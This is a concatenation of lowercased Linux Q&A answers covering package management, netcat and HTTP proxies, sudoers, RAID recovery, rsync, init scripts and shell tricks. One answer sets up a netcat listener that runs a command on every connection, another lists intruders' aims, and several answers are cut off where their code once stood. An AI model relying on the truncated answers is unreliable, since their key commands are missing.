it is just his convention for indicating the template type the dep was based on . managed means that dependency was defined with the managed template . from http://benhoskin.gs/2010/08/01/design-and-dsl-changes-in-babushka-v0.6 ( emphasis mine ) : that is all cleaned up now . just as sources have been unified , deps are always defined with the dep top-level method now , whether they use a template or not . instead of saying gem ' hpricot ' , you say either dep ' hpricot ' , :template => ' gem ' , or dep ' hpricot . gem ' . these two styles produce the same dep--- the choice is there to allow you to include the template type in the dep 's name . earlier in the same article , he explains that the original name for the managed template was pkg , which was causing confusion for his mac users who assumed it meant they were for mac installer packages : the pkg template was renamed to managed because it looked like it handled os x installer packages . unfortunately , that leads to confusion in the dep list : i am guessing you would not have asked what the package suffix name meant if it was called " java . pkg " . :- )
assuming these .exefiles were actually compiled for linux ( and your specific architecture ) you need to ensure they have execute permissions : chmod +x your_file_names_here  to make sure these files are actually meant to run on linux , check the output of file one_file_name_here 
building on @john siu 's answer the terminology is confusing if you are not familiar with the redhat technologies . rhel &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; - enterprise linux ( commercial version of redhat 's os ) centos &nbsp ; &nbsp ; - community version of rhel ( binary compatible with rhel ) fedora &nbsp ; &nbsp ; &nbsp ; &nbsp ; - bleeding edge os built by the fedora project ( redhat sponsored community proj . ) rpm &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; &nbsp ; - redhat package manager note : RPM is not a redhat only technology , opensuse uses RPMs as well and these are not necessarily compatible with RPMs built for one of the 3 redhat based distros ( rhel , centos , or fedora ) . new technology usually shows up first in fedora where it is worked out . fedora distros usually have a shelf life of 6 months . at any time 2 releases are being actively supported , after which updating for it is dropped . once technologies have been proven out in fedora they will eventually show up in a release of rhel . rhel 's shelf life is 10 years of production followed by 3 years of extended coverage . see here for full details . centos is another community project that is not sponsored by redhat but does have their blessing . centos provides the same identical packages as rhel with the rhel branding stripped out and/or replaced with centos logos and branding . centos is sponsored by several customers that have very large numbers of computers but do not want to have to pay for a subscription of rhel for each box . the centos project does not offer any support other than staying in lock step with updates as they come out for rhel . there are a lot of other distros that make use of RPMs for package management . some derive from redhat distros while other only make use of RPM the technology but are not compatible with redhat distros in any way , such as opensuse .
you need a build automation tool , of which many exist . even if you restrict to decent tools for building c++ programs that work on both solaris and windows , there are probably hundreds of choices . the classic language-agnostic build automation tool in the unix and windows world alike is make . there is a general consensus that it is possible to do better but no consensus as to who has actually done better . build automation tools merely execute a series of instructions to produce the resulting binaries and other products from the source . it sounds like you probably want a continuous integration tool , which could do things like checking out from svn ( possibly automatically in a commit hook ) , calling make , calling test scripts , uploading the resulting product and test result somewhere , send a notice when the build is finished and show some kind of dashboard with the history of builds . there is not a de facto standard continuous integration tool , let alone “best” . check through the wikipedia list , pick a few likely-looking ones and spend a few minutes looking through their documentation . then select one and set it up . unless you have other requirements that you did not mention , most of these products should be suitable .
this site helps find linux-compatible printers : http://linuxdeal.com/printers.php?type=aio this site helps let you know if printers you already have or want are linux-compatible : http://www.openprinting.org/printers hope this helps !
changing the pidfile option to pidfile2 seems to fix this issue . pidfile2 = /tmp/myapp-master.pid  interestingly the service uwsgi stop returns [OK] but the service uwsgi start returns [fail] so i am assuming the error happens when a non privileged user ( i.e. . www-data ) is trying to write to the pidfile which has been created by a privileged user ( e . g . root ) . pidfile2 will create the pidfile after privileges drop - so www-data can happily write to it . if someone else can shed light on whether this is the case that would be great .
no , you can not give a running program permissions that it does not have when it starts , that would be the security hole known as ' privilege escalation ' . two things you can do : save to a temporary file in /tmp or wherever , close the editor , then dump the contents of temp file into the file you were editing . sudo cp $TMPFILE $FILE . note that it is not recomended to use mv for this because of the change in file ownership and permissions it is likely to cause , you just want to replace the file content not the file placeholder itself . background the editor with ctrl + z , change the file ownership or permissions so you can write to it , then use fg to get back to the editor and save . do not forget to fix the permissions ! edit : see this related question for other solutions in advanced editors that allow writing the file buffer to a process pipe .
most likely you just need to remove the world-executable permission : sudo chmod o-x $(which command)  if the binary is owned by some group other than root , you probably want to set that to : sudo chgrp root $(which command) 
simple and platform agnostic : ensure that the two networks to be bridged have different subnet addresses . enable standard linux ip forwarding in /etc/sysctl . conf . for different subnets , assuming you are using the allocated private class c space , 192.168.1 . * and 192.168.2 . * are different subnets .
what immediately comes to mind is an underprivileged user being able to run things on boot as root , which is desirable to crackers that : want to escalate privileges of other accounts want to use your server to host a rogue service want to start irc/spam bots if the server reboots want to ping a mother ship to say " i am up again " and perhaps download a new payload want to clean up their tracks . . . other badness . this is possible if your underprivileged user is somehow compromised , perhaps through another service ( http/etc ) . most attackers will quickly run an ls or find on/of everything in /etc just to see if such possibilities exist , there is shells written in various languages they use that makes this simple . if you manage the server remotely , mostly via ssh , there is a very good chance that you will not even see this unless you inspect the init script , because you will not see the output at boot ( though , you should be using something that checks hashes of those scripts against known hashes to see if something changed , or version control software , etc ) you definitely do not want that to happen , root really needs to own that init script . you could add the development user to the list of sudoers so that it is convenient enough to update the script , but i would advise not allowing underprivileged write access to anything in init . d
netcat is not a specialized http client . connecting through a proxy server for netcat thus means creating a tcp connection through the server , which is why it expects a socks or https proxy with the -x argument , specified by -X: connect specifies a method for creating ssl ( https ) connections through a proxy server . since the proxy is not the other end point and the connection is endpoint-wise encrypted , a CONNECT request allows you to tunnel a point-to-point connection through an http proxy ( if it is allowed ) . ( i might be glossing over details here , but it is not the important point anyway ; details on " HTTP CONNECT tunneling " here ) so , to connect to your webserver using a proxy , you will have to do what the web browser would do - talk to the proxy : $ nc squid-proxy 3128 GET http://webserver/sample HTTP/1.0  ( that question has similarities to this one ; i do not know if proxychain is of use here . ) addendum a browser using an ordinary http proxy , e.g. squid ( as i know it ) , does what more or less what the example illustrated , as netcat can show you : after the nc call , i configured firefox to use 127.0.0.1 port 8080 as proxy and tried to open google , this is what was output ( minus a cookie ) : by behaving this way , too , you can use netcat to access a http server through the http proxy . now , what should happen if you try to access a https webserver ? the browser surely should not reveal the traffic to anyone in the middle , so a direct connection is needed ; and this is where CONNECT comes into play . when i again start nc -l 8080 and try to access , say , https://google.com with the proxy set to 127.0.0.1:80 , this is what comes out : you see , the CONNECT requests asks the server for a direct connection to google.com , port 443 ( https ) . now , what does this request do ? $ nc -X connect -x 127.0.0.1:8080 google.com 443  the output from the nc -l 8080 instance : CONNECT google.com:443 HTTP/1.0  so it uses the same way to create a direct connection . however , as this can of course be exploited for almost anything ( using for example corkscrew ) , CONNECT requests are usually restricted to the obvious ports only .
the linux version of the adobe reader has reached eol . you can still download it however via these links . the details of all this are discussed in this if ! 10 post titled : install adobe reader on fedora 20/19 , centos/rhel 7/6.5/5.10 . http://linuxdownload.adobe.com/linux/i386/adobe-release-i386-1.0-1.noarch.rpm http://linuxdownload.adobe.com/linux/i386/flash-plugin-11.2.202.400-release.i386.rpm http://linuxdownload.adobe.com/linux/i386/adberdr9.5.5-1_i486linux_enu.rpm http://linuxdownload.adobe.com/linux/x86_64/adobe-release-x86_64-1.0-1.noarch.rpm http://linuxdownload.adobe.com/linux/x86_64/flash-plugin-11.2.202.400-release.x86_64.rpm the eol is discussed here on the adobe website : one year from now : adobe reader and acrobat 9 eol . it was dated june 8th , 2012 . to install it , i did the following : $ sudo yum localinstall \ http://linuxdownload.adobe.com/linux/i386/AdbeRdr9.5.5-1_i486linux_enu.rpm  note : you may encounter issues with this package and might not be able to install it . i , for example , have hipchat installed and this package conflicted with that one , and i was unable to install acroread . all is not lost if you encounter this issue , however . you can navigate to this url : ftp://ftp.adobe.com/pub/adobe/reader/unix/9.x/9.5.5/enu/ , and download a tarball of acroread , and attempt to install that where ever you desire . much of this was covered in my answer to this other u and l question titled : how to install adobe acrobat reader in debian ? .
falken is most likely a reference to the incredibly crappy 1983 movie war games . i will probably get voted down for saying that because a lot of people like that movie , but it was just dumb . worse , it set the standard for how hacker movies were supposed to look . otoh i could not stand the movie back then . . . but i would probably be amused by it today . moof is probably a reference to the apple dogcow , which was a popular in-joke in mac programming circles in the mid-1980s . i recall references to the dogcow in apple tech notes of that era , and maybe also in the macintosh programmer 's workshop ( mpw ) documentation . it is hard to be believe it now , but once upon a time , apple used to be a company full of hackers and geeks . i do not know about moog - maybe someone at mageia likes early analog synthesizers ? the aliases can almost certainly be deleted or commented out without causing any problems . they are probably just a joke .
here is an explanation of the three source uris you have listed . wheezy-updates : see the stableupdates page on the debian wiki as the page explains , this path will be used for updates which many users may wish to install on their systems before the next point release is made , such as updates to virus scanners and timezone data . these were previously known as volatile . both wheezy/updates and testing/updates are security fixes , to the stable release and testing respectively . security fixes for testing are relatively recent , and supported on a best-effort basis . these correspond to the pages security information for wheezy/updates and security fixes for testing for testing/updates . if you are asking why these have different forms , that is just how the people concerned choose how to have things set up . the / forward slash corresponds to the structure of the underlying url , which in turn corresponds to the directory structure of the corresponding apt repository . so , for example the source uri deb http://http.debian.net/debian wheezy-updates main corresponds to the url http://security.debian.org/dists/wheezy/updates/ the source uri deb http://security.debian.org/ testing/updates main contrib non-free corresponds to the url http://security.debian.org/dists/testing/updates/ the source uri deb http://debian.lcs.mit.edu/debian/ wheezy-updates main contrib non-free corresponds to the url http://debian.lcs.mit.edu/debian/dists/wheezy-updates/
the ps status DWN is the combination of the flags : D uninterruptible sleep (usually IO) W paging (not valid since the 2.6.xx kernel) N low-priority (nice to other users)  being stuck in disk-wait is the concerning which is pretty indicative of a driver bug . a driver attached to even a horribly broken drive should eventually timeout and return eio to system calls accessing it . if you are running a " custom-built " kernel as you say with a filesystem so rare that i would not heard of it before your question where a driver can get stuck in an endless wait suggests you should consider your production machine broken . personally , i would be wary of a driver that appears to have been orphaned a decade ago especially since the motivating reasons for creating the driver have mostly been obviated by flash controller advances . added in response to comment : unfortunately , a wedged driver will often seize the hardware channel and nothing short of a reboot can get it to release . you say that this device is operationally difficult to get to ; i hope it is not on mars . before sending someone to restart it , make sure you remove the mount of the device ( often in /etc/fstab , but it could be in — for example — /etc/rc . local ) or else the system will likely hang again . as @goldilocks noted in the comments , failed hardware is a distinct possibility , so if the flash is removable , i would send the technician with replacement hardware . it is worth noting that flash memory has a limited number of write-cycles before failure and older flash had a lower number of write-cycles than modern flash . once the problem is cleared , you can build a new filesystem on the memory and mount it , provided your remote interface allows it .
use webcamstudio for gnu/linux . ( reference : live screencasting to ustream ) as their website says , webcamstudio for gnu/linux creates a virtual webcam that can mix several video sources together and can be used for live broadcasting over bambuser , ustream or stickam view the demo here .
keep the status in a variable and use it in an END block . awk -F: 'NF != 7 {print; err = 1} END {exit err}' /etc/passwd 
it is possible to assign users in a group permission to run an executable by using the /etc/sudoers mechanism . for instance , to permit all users in the users group to run hddtemp with root permissions run visudo as root and add : %users ALL = (root) NOPASSWD: /path/to/hddtemp 
the copy will fail prematurely with a file system full situation . in the best case , 4gb of swap and 6gb of ram will be used to store the original file and the truncated copy . that leaves 10 gb of ram for the remaining processes , cache and other kernel usage .
logrotate was a good idea . like any regular file , wtmp could have been " sparse " ( cf . lseek ( 2 ) " holes " and ls -s ) which can show a extreme file size that actually occupies little disk . how did the hole get there , if it was a hole ? getty(8) and friends could have had a bug . or a system crash and fsck repair could have caused it . if you are looking to see the raw contents of wtmp , od or hd are good for peeking at binaries and have the happy side effect of showing long runs of empty as such . unless it recurs , i would not give it much more thought . a marginally competent intruder would do a better job than that , the contents are not all that interesting , and little depends on them .
the syntax ( str^^ ) which you are trying is available from bash 4.0 and above . perhaps , yours is a older version : try this : str="Some string" echo $str | awk '{print toupper($0)}'  guru .
with gnu ls ( the version on non-embedded linux and cygwin , sometimes also found elsewhere ) , you can exclude some files when listing a directory . ls -I 'temp_log.*' -lrt  with zsh , you can let the shell do the filtering . pass -d to ls so as to avoid listing the contents of matched directories . setopt extended_glob # put this in your .zshrc ls -dltr ^temp_log.*  with ksh , bash or zsh , you can use the ksh filtering syntax . in zsh , run setopt ksh_glob first . in bash , run shopt -s extglob first . ls -dltr !(temp_log.*) 
technically the default is that sshd does not use pam . from the sshd_config manpage : usepam enables the pluggable authentication module interface . [ . . . ] the default is ``no'' but this option is almost universally enabled by ssh installations by os distributions and default config files and such . you can check if it is enabled in /etc/ssh/sshd_config if you want to be sure though . however , even when pam is in use by sshd , you can still be authenticated with an ssh key , which bypasses the pam authentication part ( pam accounting and session management are still done ) .
i have created an utility that sends neccesary commands to the keyboard for it to report additional key events : https://github.com/tuxmark5/apexctl
catfish is a frontend for locate , among others . i think it satisfies all of your requirements , except for the ultra-simple part .
to override env_keep only for /path/to/command ( when invoked through any rule , by any user ) and for the user joe ( no matter what command he is running ) : Defaults!/path/to/command env_keep=HOME Defaults:joe env_keep=HOME  you can use -= or += to remove or add an entry to the env_keep list .
$ echo 0.4970436865354813 | awk -v CONVFMT=%.17g '{gsub($1, $1*1.1)}; {print}' 0.54674805518902947  is probably the best you can achieve . use bc instead for arbitrary precision . $ echo 'scale=1000; 0.4970436865354813 * 1.1' | bc .54674805518902943 
you can get information from an elf file ( executable or library ) with readelf . looks like you are looking for the exported symbols , so use : $ readelf --dyn-syms libyourthing.so  for c-type functions , you will only get function names , not argument types or return values . for c++ functions , you will get mangled names - pipe the output of that command through c++filt to get function names and argument types ( still no return values though ) . ( globals are also displayed in the output , with their names and size but not their type . ) other useful tools are nm and objdump which provide similar information . i am not sure that'll help you though . you should also try strace to see if python is looking where you think it is . something like : $ strace -e trace=open python your_code_that_loads_your_lib.py  will show you all the open calls executed by python - look for your library name in there ( there will be a lot logged by the above , filter it ) . each call also shows the return code , so you might get a better idea about what is going on . oh , and do make sure you are not trying to load a 32bit library into a 64bit python runtime , or vice-versa .
sound is not associated with a display , so no , you can not mute by display . but you can mute by application . an easy way is to run the pavucontrol gui : it shows volume controls for playback and recording for each application that has a pulseaudio connection open . alternatively , if you control the way the application is launched , tell it not to contact any existing pulseaudio server . PULSE_SERVER=none vlc /path/to/sound.ogg 
sda0 , sda1 are the hard drives attached to your machine . dm-0 and dm-1 are the logical volume managers ' logical volumes you would have created while installing or configuring your machine you can read more about it at wiki
scp does detect whether it is got a controlling tty . if you run it as a foreground process it will show a progress bar , but if you background it , the progress bar disappears , so there are some internal checks going on . i would do as @peterph says and start the transfer in either a tmux or screen session . i am not sure of the implications of using nohup , but just keep a controlling terminal active . as the file is that big , if it is not compressed , i would also add compression to the transfer with scp 's -C option . if it is a directory , and you have been retrying the same command quite often , you should probably use rsync , which first checks if files differ ( with md5 checksums ) before transferring them . you can also resume big file transfers with the --partial option . rsync -avz --partial --progress --rsh=ssh Files-from-Server-A [...] user@B:/tmp/ 
" input/output error " points to a low-level problem that likely has little to do with the filesystem . it should show up in dmesg and the output of smartctl -x /dev/sdX may also provide clues . you can also try to strace -f -s200 ntfs-3g [args] 2&gt;&amp;1 | less to see which syscall hits the i/o error . the root cause is probably one of the following : defective sata cable in debian box ; problem with power supply or sata power cable in debian box ; failing disk ; bug in ntfs-3g causing it to try accessing beyond the end of the device ( perhaps coupled with some weirdness in the specific ntfs volume you have that is somehow not affecting the other implementations ) ; defective ram in debian box . if you post the output of the above commands , it may be possible to say which . ( sorry , this should likely have been a comment , not an answer , but i do not have the necessary reputation here . )
the details on how to do this were found here in this blog post titled : locking the screen from the command line in gnome 3.8 . manually triggering the dbus-send command can be used to send this message , in this case we are sending the " lock " message to the screensaver . $ dbus-send --type=method_call --dest=org.gnome.ScreenSaver \ /org/gnome/ScreenSaver org.gnome.ScreenSaver.Lock  timeout typically this same message will be sent when you have configured for this particular timeout to occur through the desktop settings . you can check the amount of idle time required before the locking will automatically get triggered , from the gnome control center , settings -> power -> blank screen . you can check the value of this delay from the command line like so : $ gsettings get org.gnome.desktop.session idle-delay uint32 600  also you can change it via the command line , or through the gnome control center . $ gsettings set org.gnome.desktop.session idle-delay 300 
since .plist files are already xml ( or can be easily converted ) you just need something to decode the xml . for that use xml2: you should be able to figure out the rest . or for perl , use XML::Simple; ( see perldoc for more ) to put the xml data structure into a hash .
there is no reason for you to write this script . /etc/init.d/mysql is an init(1) script , so just use that : # update-rc.d mysql defaults  if that does not work , you might need to look into the more advanced update-rc.d options . for instance , maybe you are using an uncommon runlevel , and the default runlevels for the provided mysql script do not include that . if you were actually trying to get something to run on startup which does not already provide an init script , you had need to remove the sudo bit . init scripts run as root already . you actually have to drop permissions if you need your program to run as another user .
something like this :
i managed to reproduce the problem again and it was result of a big disk cache . my disk caches can grow more than 8gb and seems that some applications does not like it and i/o suffers . dropping disk caches with echo 3 &gt; /proc/sys/vm/drop_caches as root remedies the problem . i currently do not know why large disk caches causes this i/o degradation .
you can use the time bash builtin . consider this example and modify the cron job accordingly : $ time ( ls -lrt &amp;&gt;/dev/null ) real 0m0.002s user 0m0.000s sys 0m0.001s  you can also redirect the output somewhere else : time ( $CRON_JOB_CODE ) &amp;&gt; /var/log/updatedb.time.log 
the script /etc/gdm/postsession/default is run by root whenever someone quits his x session . you might add there something like if [ ${USERNAME} = "myuser" ];then su myuser -c /home/myuser/logout.sh fi  before the exit 0 . then create a file /home/myuser/logout . sh , make it executable and add your rsync call to it .
you could switch to esmtp , there it is pretty trivial :
when a command is not found , the exit status is 127 . you could use that to determine that the command was not found : until printf "Enter a command: " read command "$command" [ "$?" -ne 127 ] do echo Try again done  while commands generally do not return a 127 exit status ( for the very case that it would conflict with that standard special value used by shells ) , there are some cases where a command may genuinely return a 127 exit status : a script whose last command cannot be found . bash and zsh have a special command_not_found_handler function ( there is a typo in bash 's as it is called command_not_found_handle there ) , which when defined is executed when a command is not found . but it is executed in a subshell context , and it may also be executed upon commands not found while executing a function . you could be tempted to check for the command existence beforehand using type or command -v , but beware that : "$commands"  is parsed as a simple commands and aliases are not expanded , while type or command would return true for aliases and shell keywords as well . for instance , with command=for , type -- "$command" would return true , but "$command" would ( most-probably ) return a command not found error . which may fail for plenty of other reasons . ideally , you had like something that returns true if the command exists as either a function , a shell builtin or an external command . hash would meet those criteria at least for ash and bash ( not yash nor ksh nor zsh ) . so , this would work in bash or ash: one problem with that is that hash returns true also for a directory ( for a path to a directory including a / ) . while if you try to execute it , while it will not return a command not found error , it will return a Is a directory or Permission Denied error . if you want to cover for it , you could do :
okay , clearly one of your disks is not active in the array right now . let 's say , under the current enumeration , that /dev/md0 is missing /dev/sdb1 . to add /dev/sdb1 back in its former state : mdadm -a --re-add /dev/md0 /dev/sdb1  you may want to re-check the array to make sure the data is all consistent . echo check &gt;&gt;/sys/block/md0/md/sync_action  to re-mirror from scratch : make sure that /dev/sdb1 is completely removed from the array . mdadm -f /dev/md0 /dev/sdb1 mdadm -r /dev/md0 /dev/sdb1  wipe out the configuration on /dev/sdb1 so that mdadm will add it to back to the array as if it were a completely new disk . mdadm --zero-superblock /dev/sdb1  add /dev/sdb1 back to the array as a member . mdadm -a /dev/md0 /dev/sdb1  syncing a disk on usb works , slowly . however , i would guess that your problem is that your bootloader is not installed properly on your second drive , which is preventing you from booting when it is inserted . you could swap the order of those two drives , so that your system boots off of the drive with known good configuration . once you are up and running and can sync both drives , you should re-install the bootloader on both drives . this way you can always boot no matter which drive is missing or enumerates first . how to re-install your bootloader varies : if you are using lilo ≥ 22.0 , specify boot = /dev/md0 and raid-extra-boot = mbr in /etc/lilo.conf and re-run lilo . if you are using an older lilo , create two lilo configurations , one for each disk in the the array , and install lilo to each disk individually . if you are using grub , try to run grub-install /dev/sda and grub-install /dev/sdb . if that fails , then try using the grub shell to setup (hd0) and setup (hd1) ( cat /boot/grub/device.map to see what grub 's hard disk numberings are ) .
you can use the -delete option if your version of find supports it or you can use rm in the -exec options . find -iname '*libre*' -delete # GNU find find -iname '*libre*' -exec rm {} + # POSIX  note that you should quote the pattern . this prevents the shell from expanding it prior to being passed to the find command .
the input format requires character-backspace-underscore or character-backspace-letter to underline a character . you also get boldface with character-backspace-character . echo $'hello k\b_i\b_t\b_t\b_y\b_ world' | ul  less does a similar transformation automatically .
you need an interactive shell for alias definitions : bash -i -c "alias" 
i would recommend , especially since you are not an advanced user , a separate /home , as above , and periodical backup to optical media : cheap , easy and somewhat reliable . if you really have important data , i would think of something else , though .
the /proc filesystem is not real , it is a view into kernel-internal data , exported to look like files . it exists in linux and in solaris ( from where the idea was shamelessly pilfered ) , and maybe other unixy systems . the format is very system-dependent ( and has even changed substantially among linux kernel versions ) . there really is not any halfway portable way of finding out hardware data ( and can not be , some unices and lookalikes run on pretty strange iron ) .
after searching some more i stumbled upon proot which combines chroot with the ability to mount any directory into the new root . it supports any file operation inside its chroot , yes even symlinks , that will happily work even after proot unmounted the directory . it does not need root privileges and made my complicated setup of schroot + pyfilesystem unnecessary .
turns out i had enabled ssh on my tomato router on the same port . my connection attempt had been to the router , not to my host . i changed the ports and all is good .
you can configure debconf into non-interactive prompt : sudo DEBIAN_FRONTEND=noninteractive aptitude install -y -q chef  if you find the complete key , you can also pre-configure the default value : echo package package/key {boolean,string} {true, some string} | sudo debconf-set-selections sudo apt-get install package  to be precise : echo chef chef/chef_server_url string | sudo debconf-set-selections  to find the key , after installing you can look for : sudo debconf-get-selections | grep chef # URL of Chef Server (e.g., http://chef.example.com:4000): chef chef/chef_server_url string 
so , since you seem ok with the idea , for any searchers : ecryptfs and its associated pam facilities do more or less what you want . the filesystem stores an encrypted key which the pam module locks and unlocks as appropriate . this key is used to read and write files on a fuse filesystem that is mounted on top of the real filesystem over the user 's home directory . anyone else just sees the encrypted key and a bunch of encrypted files with obfuscated names ( ie , even if you name your file " super secret stuff " , without the user 's password somebody else only sees " x18vb45" or something like that ) . there is a bit of memory and processor overhead , and someone who can see arbitrary memory locations can get more when the user is logged in , but that is true for an file encryption .
just press ctrl + h . i found this on the following page , titled : elementaryupdate . excerpt install to install , download the following file , extract it , and move it to ~/ . icons . the folder , . icons , is a hidden folder inside of your home directory . you can show hidden folders by pressing ctrl+h inside of the files application .
i was led to a page that provided explanations , and creating the following files worked for me : /etc/acpi/actions/volume #! /bin/sh step=5 case $1 in - amixer set Master $step-;; + amixer set Master $step+;; esac  /etc/acpi/events/volume_down event=button/volumedown action=/etc/acpi/actions/volume -  /etc/acpi/events/volume_up event=button/volumeup action=/etc/acpi/actions/volume + 
use this : "${index}_${lumarr[lum]}"  generally : interpolate all variables using ${...} notation . unless you expressly want to use word-splitting , always enclose variable interpolations in double-quoted strings .
you need to rebuild libpcre with position independent code . the straightforward way to do that is to build or install the libpcre shared objects ( e . g . libpcre.so ) which are built with -fPIC . since the library archive was in /usr/lib/x86_64-linux-gnu , the shared objects might be there also . try adding -L/usr/lib/x86_64-linux-gnu to LDFLAGS of php . this will also save you from symlinking to /usr .
you need to pass your arguments to push-mark , not global-set-key: (global-set-key (kbd "M-SPC") (lambda() (interactive) (push-mark nil nil 1))) 
as per rajesh , adding an option to the server seemed the best way to go . see this question for complete details
i am not sure , but it sounds like a dhcp issue . maybe the acccess point you want to connect to is not set up with dhcp , or not available ? for now , try pressing ctrl-c when this message appears , sometimes it works ( dont know about clearos ) . if it works let this service start in background .
you could use something like this : while true; do nc -lvp 1337 -c "echo -n 'Your IP is: '; grep connect my.ip | cut -d'[' -f 3 | cut -d']' -f 1" 2&gt; my.ip; done  nc will be executed in endless loop listening on port 1337 with verbose option that will write information about remote host to stderr . stderr is redirected to file my.ip . option -c for nc allows to execute something to " handle " connection . in this case we will next grep for ip addres from my.ip file . pbm@lantea:~$ curl http://tauri:1337 Your IP is: 192.168.0.100 
a " file " can be a couple of things . for example man find lists : in your case that " file " might be a broken symlink or a regular file containing the text " no such file or directory " . you can use ls -ld sublime to find out . ( the first character indicates the type of the file . )
you can use applescript like so :
find the package name with dpkg -S /path/to/types.h , and re-install it with apt-get install --reinstall XXX
if you have a version of gnu grep with pcre ( -P ) support , then assuming you mean the first occurrence of ,ou grep -oP '(?&lt;=dn: uid=).+?(?=,ou=)' file  if you want to match up to the second ,ou you can remove the non-greedy ? modifier grep -oP '(?&lt;=dn: uid=).+(?=,ou=)' file  the expressions in parentheses are zero-length assertions ( aka lookarounds ) meaning that they form part of the match , but are not returned as part of the result . you could do the same thing natively in perl e.g. perl -ne 'print "$1\\n" if /(?&lt;=dn: uid=)(.+?)(?=,ou=)/' file  it is possible to do something similar in sed , using regular ( non zero-length ) grouping e.g. ( for gnu sed - other varieties may need additional escaping ) sed -rn 's/(.*dn: uid=)([^,]+)(,ou=.*)/\2/p' file  or simplifying slightly sed -rn 's/.*dn: uid=([^,]+),ou=.*/\1/p' file  note the [^,] is a bit of a hack here , since sed does not have a true non-greedy match option . afterthought : although it is not exactly what you asked , it looks like what you actually want to do is read comma-separated name=value pairs from a file , and then further split the value of the first field from its name . you could achieve that in many ways - including awk -F, '{sub(".*=","",$1); print $1}' file  or a pure-bash solution such as while IFS=, read -r a b c d; do printf '%s\\n' "${a#*=}"; done &lt; file 
messages to the users go on stderr . what goes to stdout is the result of the openssl command . by default , unless you use -in or -out , openssl takes data ( keys , certificates . . . ) in from stdin and writes data out on stdout ( the result like the request pem file ) . in a shell you typically use it as : openssl cmd &lt; in.pem &gt; out.pem  you do not want the messages to the user to end up in out.pem which is why they are issued on stderr .
according to the manual : ps ( 1 ) sz is a measure of text , data , and stack pages in the process virtual address space . the unit of measure is one page . so ps ( 1 ) is reporting a virtual size of 82 620 416 bytes . top ( 1 ) size is a measure of text , data , stack , mmap regions , shared memory regions , and io mapped regions in the process virtual address space . the unit of measure ( m ) is one megabyte . so top ( 1 ) is reporting a virtual size of 1 718 616 064 bytes . is the process perhaps mapping a 1.5 gb file ?
i was running a freebsd based firewall without problems over many years with this particular issue . if you do not want to perform traffic shaping stuff , you do not need to fix , i would say . or to say it in a different way : i would not fix it .
this works . save it to increment.bash then type bash increment.bash 2 to get the incrementing starting at 2 , or bash increment.bash 4 to start at 4 . will start at 2 if none defined . ( made some refinements to where the previous actually works ) here it is in action :
first , the easy way : rsync has a --bwlimit parameter . that is a constant rate , but you can use that to easily throttle it down . now , if you want the adaptive rate , there is the linux traffic control framework , which is actually fairly complicated . there are several references i am aware of : linux advanced routing and traffic control traffic control howto a practical guide to linux traffic control personally , when i have to set this up , i use tcng to simplify the task . here is an example : in that example , traffic being sent out over the office interface is being classified into several classes : ssh , kyon , fast , and default . the link ( a t1 , when this was in use ) is capped at 1440kbps ( this must be slightly lower than the actual link rate , so that buffering happens on the linux box , not a router ) . you can see that ssh is assigned 720kbps , kyon 360 , etc . all can burst to the full rate ( the ceil ) . when there is contention , the ' rate ' acts as a ratio , so ssh would be given 1/2 , kyon 1/4 , etc . the ' sfq ' says how to handle multiple ssh sessions ; sfq is a form of round-robin .
given that you want to track all user commands , you should look at the acct package on your system ( on some systems this is also called " process accounting " or psacct ) . then after it is been turned on , you can run the lastcomm command to show what programs have been run , by whom , when and for how long . from google , search " linux acct " for more details . http://beginlinux.com/blog/2010/01/monitoring-user-activity-with-psacct-or-acct/ http://www.cyberciti.biz/tips/howto-log-user-activity-using-process-accounting.html
i finally figured it out while trying to get it to work for firefox ! this is based from the direction i found here . now restart chrome and firefox . both should be using the debug version of the flash plugin !
what we have done here is use lookbehind regex in "(?&lt;=foo=)[0-9]+" .
physical address extension ( pae ) sounds exactly like what he is referring to . a 32-bit cpu can only map ~4gb of memory , even if the system has more . but with pae , you can use > 4gb , though only 4gb of it is mapped at any one time ( a single process will never be able to use > 4gb ) . so basically when the kernel changes the actively running process , it re-maps the virtual memory to the physical memory which that process is currently using .
run the following command to give userBname access to the display:xhost +SI:localuser:userBname you may use xhost + to give access to everybody ; however this is insecure . better is to give access on a per-user basis . the correct syntax for xhosts entries for local users is SI:localuser:username . then su userBname , export DISPLAY=:0.0 , and finally run your gui program . although you granted access to the display earlier with xhost , you must also set the environmental variable DISPLAY so that programs know where to place their graphical output . allowing different DISPLAY variables for different users allows multiple users connected to a single machine to use different physical terminals .
i do not have such device so i cannot test it , but i guess if you install new version of ubuntu it will just work . ubuntu 9.10 is quite old . this month the 12.04 lts will be released . you can download beta2 iso , burn it , and test it . good luck .
@ilua 's answer did not work , but it did give me some ideas of what to search for , and i solved the problem . the style i needed was regular . from man zshcompsys: i used zstyle ':completion:*' regular 'false' , and it works perfectly .
by default , wc print result along with filenames . if you want only the result , you must make wc read input from stdin : &lt;/usr/share/dict/words wc -w &gt; ~/dicwords.txt  with your current solution , you can use some other tools to get only the result from wc , like cut , awk , grep . . . wc -c /usr/share/dict/words | cut -d' ' -f1 &gt; ~/dicwords.txt 
i guess the traditional way would be to make pseudo-users ( like the games-user ) for the program/set of programs , assign this user to the groups for devices it should access ( eg . camera ) , and run the program ( s ) suid as this user . if you removed permissions for " others " ( not owner or group ) , only the owner and members of the group - including the pseudo-user - could access it . further more , you could use the group of the program ( s ) to restrict which users where allowed to execute the program ( s ) . make a group ( eg . conference ) for the users allowed to make video-conferences , and restrict the execution of the associated programs ( the ones granted special access to camera and mic ) to this group only . +++ another way is running the program sgid as the special-group belonging to the device , and remove permission for " others " . this of course only work if the program need to access just one restricted device .
from /etc/rc ? . d/readme : to disable a service in this runlevel , rename its script in this directory so that the new name begins with a ' k ' and a two-digit number , and run ' update-rc . d script defaults ' to reorder the scripts according to dependencies . files starting with S are started , and those with K are killed if running prior to the runlevel switch . this is why there is a K type , it stops something that may be running instead of doing nothing which would happen if there was no [SK]??unmountiscsi.sh present .
cat-v has a plan 9 doc archive that contains a number of papers , manual pages for various editions and other interesting miscellanea .
